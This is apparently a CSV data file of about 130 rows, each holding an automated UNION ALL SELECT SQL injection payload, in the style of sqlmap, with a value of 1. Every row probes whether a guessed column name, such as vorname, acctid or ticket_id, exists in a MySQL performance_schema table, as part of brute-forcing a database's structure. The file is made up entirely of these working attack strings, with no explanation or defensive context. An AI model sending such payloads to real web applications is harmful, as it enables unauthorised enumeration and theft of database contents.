column,num
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT totpv FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XUkW",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT imagen_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gZtV",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT esquema FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BkaW",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT atividade_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LCir",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xgarantia FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wnTg",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT discount_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kVHx",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xnatureza FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FXdR",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT group_perm_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YyIG",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT category_child_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FGwm",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT newssummaryauthor FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qiTI",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT and_xevento FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NkEy",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rolle_nr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aomX",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT standort_nr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IIWB",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ja FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Asdn",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT persnr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EpVI",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vorname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- juLm",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT width FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EGCA",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT titel FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FxxQ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT filename FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PTsV",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT post_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WIPh",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT swidth FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uZZq",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT height FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eCmI",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vorgaenger FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tgSK",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT matrnr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tyUC",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kursnr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nJfb",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT notification_type FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DECz",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sheight FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fAxt",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT style_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EQfL",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT startnummer FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VyZd",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bezeichnung FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TVVt",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT basename FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZxKa",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kat_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Mqpm",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT whabfragen FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SSAa",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT struct_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SibK",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT havabfragen FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Rcbb",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT abfrsql FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Sgrp",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vorlnr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UEKX",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ban_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KTmV",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT forum_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PrVx",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rank_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DfUe",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oRuz",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT k_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iytK",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nachname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Iwqy",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ort FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WwJG",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT key_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mhhf",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT groesse FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LrgC",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT datum FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dmDG",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT image_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MfzJ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT entry FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dQim",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT speise_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tiHC",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT word_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rspj",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT absatz_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IeNe",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT class_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zCyc",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mail_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VWfU",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT zid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lQPq",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ticket_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XByg",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT queue_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EFdk",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pid1 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yMCJ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pid2 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aDXD",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT currval FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EvwS",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT forum FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WeXg",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT organizationid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NtjA",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT institute_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gYfZ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT history_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nHyo",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT my FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qaMs",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT how FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZEAf",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT after FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cOzx",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT meetingid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oZFP",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mitarbeiterid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SzNI",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idgruppe FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DqCJ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT re FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vAOS",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT artikel_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HjoW",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT top FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KHEU",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT perid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mLKC",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pers_nr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Cxma",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idstelle FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Lfne",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT messageid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YKpi",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT acctid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oPQW",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT address_book_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ymOw",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT article_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gRwu",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT com FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pamD",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RpIb",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rule_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WpPf",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kosten FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Gpjy",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT plz FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HXQs",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT confirm_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MYiC",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT race_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eyfL",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vis_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cQjZ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT descr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fLJA",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT seitelayout_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hZrk",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vote_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DVTn",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT g_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GhvC",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT activated FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- weCA",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `show` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WOwK",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT guy FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WhHj",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vtyp_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MBEd",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT timeofmove FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rxDj",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT views FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Zhmk",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT meta_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WpYO",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT blz FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bfdi",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bookid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gNWa",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT teilnehmernr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UojS",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT weaponid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MWkZ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT region_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WcGw",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT resultid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Xjaa",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT calendar FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yvEG",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT address_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zmep",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pos FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OMmA",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT d_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rSzs",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT serverid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vezQ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BryM",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT answer_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fzJb",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT categories_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- exbZ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT start FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XHet",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT site_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KZRx",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT price_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KEAV",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT az FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- txlw",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mnr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lUDJ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cis_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Lovb",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT config_key FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HxBJ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT address_format_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JuXJ",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tn FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UUOl",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tax_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FmhM",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mountname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xcyS",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT standard FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rOtF",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT schweiz FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IaAb",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT partner_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IAIo",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idkontakt FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JFtk",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT eventid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hJhI",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT oldstate FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xksG",1
